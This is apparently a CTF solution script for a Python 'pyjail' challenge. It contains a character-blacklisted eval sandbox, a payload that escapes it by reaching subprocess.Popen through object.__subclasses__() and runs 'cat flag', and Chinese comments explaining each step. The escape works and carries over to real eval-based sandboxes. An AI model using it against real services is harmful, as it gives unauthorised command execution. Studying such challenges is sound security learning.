import subprocess


def pyjail(code):
    if len(code) >= 24 * 10 + 8 * 8:
        # Man! What can I say. 
        return 'Invalid code'

    # Ah, if you get here, then your final challenge is to break this jail.
    # Try it. Not as hard as it seems ;)
    blacklist = ['\\x','+','join', '"', "'", '[', ']', '2', '3', '4', '5', '6', '7', '8', '9']
    for i in blacklist:
        if i in code:
            return 'Invalid code'

    safe_globals = {'__builtins__':None, 'lit':list, 'dic':dict}
    print(repr(eval(code, safe_globals)))



payload = "{c.__name__:c for c in lit.__base__.__subclasses__()}.get(lit(dic(Popen=1)).pop())(lit((lit(dic(cat=1)).pop(),lit(dic(flag=1)).pop())),**dic(stdout=1-1-1)).communicate()"

pyjail(payload)

'''
{c.__name__: c for c in lit.__base__.__subclasses__()}

lit 是 list
lit.__base__ 是 object
object.__subclasses__()
返回当前 Python 进程中所有继承自 object 的类

object是python的所有类的基类，通过这个payload可以获取python中所有的类名和类对象

在 Python 3 里：
✅ 一切都是对象
✅ 一切类都继承自 object

object
 ├── int
 ├── str
 ├── list
 ├── dict
 ├── function
 ├── module
 ├── Exception
 └── subprocess.Popen
等等等


object.__subclasses__()
会返回：
当前解释器中，所有已经加载的类

object.__subclasses__()
返回 当前 Python 进程中，所有直接或间接继承自该类的“子类对象”

(lambda n,c,D:
    D.get(n)(c,stdout=0-1).communicate()
)(
    lit(dic(Popen=1)).pop(),
    lit(dic(cat=1,flag=1)),
    {c.__name__:c for c in lit.__base__.__subclasses__()}
)

'Popen': lit(dic(Popen=1)).pop()
'cat': lit(dic(cat=1)).pop()
'flag': lit(dic(flag=1)).pop()


{c.__name__:c for c in lit.__base__.__subclasses__()}.get(lit(dic(Popen=1)).pop())(lit((lit(dic(cat=1)).pop(),lit(dic(flag=1)).pop())),**dic(stdout=1-1-1)).communicate()

{c.__name__:c for c in lit.__base__.__subclasses__()}:
遍历所有子类，生成一个字典，Key是类名（字符串），Value是类对象。
.get(lit(dic(Popen=1)).pop()):
dic(Popen=1) 生成 {'Popen': 1}。
lit(...) 转为列表 ['Popen']。
.pop() 取出字符串 'Popen'。
.get(...) 从第一步的字典中拿到 subprocess.Popen 类。
(...):
实例化 Popen 类。
lit((lit(dic(cat=1)).pop(), lit(dic(flag=1)).pop())):
这是第一个参数 args。
内部生成了 'cat' 和 'flag' 字符串。
外层 lit((...)) 将元组转为列表 ['cat', 'flag']。
**dic(stdout=1-1-1):
这是 kwargs。生成 {'stdout': -1} 并解包传给 Popen，相当于 stdout=subprocess.PIPE。
.communicate():
执行命令并读取结果。
'''